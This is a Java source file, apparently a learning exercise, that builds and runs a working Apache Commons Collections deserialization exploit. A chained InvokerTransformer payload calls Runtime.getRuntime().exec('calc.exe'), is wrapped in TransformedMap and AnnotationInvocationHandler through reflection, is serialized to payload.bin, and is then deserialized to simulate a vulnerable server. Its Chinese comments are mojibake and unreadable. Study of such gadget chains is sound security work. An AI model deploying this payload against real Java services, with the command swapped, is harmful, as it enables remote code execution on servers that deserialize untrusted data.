package fanxulie;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import java.util.Map.Entry;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
	public class fanxulie6{
		public static void main(String[] args) throws Exception {
			//1.�ͻ��˹�����������
			//�˴�������һ��transformers�����飬�����й��������⺯��ִ�еĺ��Ĵ���
			Transformer[] transformers = new Transformer[] {
					new ConstantTransformer(Runtime.class),
					new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
					new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
					new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
			};
			//��transformers�������ChaniedTransformer����̳���
			Transformer transformerChain = new ChainedTransformer(transformers);

			//����Map����transformerChina
			Map innerMap = new HashMap();
			innerMap.put("value", "value");
			//����map����ת����
			Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
			//������Ƶ���AnnotationInvocationHandler��Ĺ��캯��
			Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
			Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
			//ȡ�����캯�����η�����
			ctor.setAccessible(true);
			//��ȡAnnotationInvocationHandler��ʵ��
			Object instance = ctor.newInstance(Target.class, outerMap);

			//payload���л�д���ļ���ģ�����紫��
			FileOutputStream f = new FileOutputStream("payload.bin");
			ObjectOutputStream fout = new ObjectOutputStream(f);
			fout.writeObject(instance);

			//2.����˶�ȡ�ļ��������л���ģ�����紫��
			FileInputStream fi = new FileInputStream("payload.bin");
			ObjectInputStream fin = new ObjectInputStream(fi);
			//����˷����л�
			fin.readObject();
		}


	}
	
	/*
	˼·:����BeforeTransformerMap�ļ�ֵ�ԣ�Ϊ�丳ֵ��
	     ����TransformedMap��decorate��������Map���ݽṹ��key/value����transforme
	     ��BeforeTransformerMap��value����ת������BeforeTransformerMap��valueִ����һ������ת�����������������ִ��

	     ִ�б���: ((Runtime)Runtime.class.getMethod("getRuntime",null).invoke(null,null)).exec(.........)
	     ���÷������Runtime() ִ����һ��ϵͳ����, Runtime.getRuntime().exec()

	*/